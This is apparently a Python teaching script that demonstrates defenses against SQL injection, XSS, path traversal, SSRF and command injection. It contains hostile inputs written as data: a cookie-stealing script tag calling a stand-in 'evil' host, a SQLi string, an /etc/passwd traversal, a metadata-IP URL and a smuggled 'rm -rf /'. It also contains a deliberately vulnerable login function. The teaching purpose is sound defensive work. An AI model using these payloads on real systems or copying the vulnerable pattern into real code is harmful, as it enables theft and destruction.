"""06_injection_defenses.py — thief vs lock, five rounds (all blocked).

Run: uv run python topics/04-auth-security/examples/06_injection_defenses.py
"""

import html
import ipaddress
import sqlite3
import subprocess
import sys
from pathlib import Path
from urllib.parse import urlparse

# --- 1. SQLi: f-string (doomed) vs placeholder (safe) ---
db = sqlite3.connect(":memory:")
db.execute("CREATE TABLE users (email TEXT)")
db.execute("INSERT INTO users VALUES ('a@x.com')")
evil = "' OR '1'='1"


def login_raw(e):
    return db.execute(f"SELECT * FROM users WHERE email = '{e}'").fetchall()  # NEVER!


def login_safe(e):
    return db.execute("SELECT * FROM users WHERE email = ?", (e,)).fetchall()


assert len(login_raw(evil)) == 1  # dumped! (demo of the hole)
assert login_safe(evil) == []  # placeholder treats input as DATA
print("SQLi: raw leaks, placeholder blocks")

# --- 2. XSS: escape on render ---
dirty = "<script>fetch('https://evil?c='+document.cookie)</script> hello"
clean = html.escape(dirty)
assert "<script>" not in clean and "hello" in clean
print("XSS: escaped -> inert text (+ HttpOnly cookies + CSP in prod)")

# --- 3. Traversal: resolve + cage check ---
BASE = Path("/tmp/shop_files").resolve()


def safe_open(name):
    p = (BASE / name).resolve()
    if BASE not in p.parents and p != BASE:
        raise ValueError("traversal blocked")
    return p


assert safe_open("bill.pdf").name == "bill.pdf"
try:
    safe_open("../../etc/passwd")
    raise AssertionError("escaped the cage?!")
except ValueError:
    print("traversal: ../../ blocked by resolve()+parents check")

# --- 4. SSRF: allowlist hosts + no metadata IP ---
ALLOW = {"api.shop.com", "hooks.partner.com"}


def fetch_ok(url):
    host = urlparse(url).hostname or ""
    if host not in ALLOW:
        raise ValueError(f"host {host} not allowlisted")
    try:
        ip = ipaddress.ip_address(host)  # literal IP? must not be non-public
    except ValueError:
        ip = None  # hostname — prod adds DNS-pinning + egress rules on top
    if ip is not None and (ip.is_private or ip.is_link_local or ip.is_loopback):
        raise ValueError("non-public IP blocked")
    return f"fetching {url}"


assert "fetching" in fetch_ok("https://api.shop.com/orders")
for bad_url in ("http://169.254.169.254/latest/meta-data/", "https://evil.com/x"):
    try:
        fetch_ok(bad_url)
        raise AssertionError(f"SSRF passed for {bad_url}?!")
    except ValueError:
        pass
print("SSRF: metadata IP + evil host blocked")

# --- 5. Command injection: argv list, never shell=True ---
out = subprocess.run(
    [sys.executable, "-c", "import sys; print(sys.argv[1])", "hello; rm -rf /"],
    capture_output=True,
    text=True,
    shell=False,  # works on Linux + Windows
)
assert "hello; rm -rf /" in out.stdout  # one harmless argument, nothing executed
print("CMDi: list-form argv neutralizes '; rm -rf /'")
print("OK — parameterize, escape, cage paths, allowlist hosts, list-form commands")
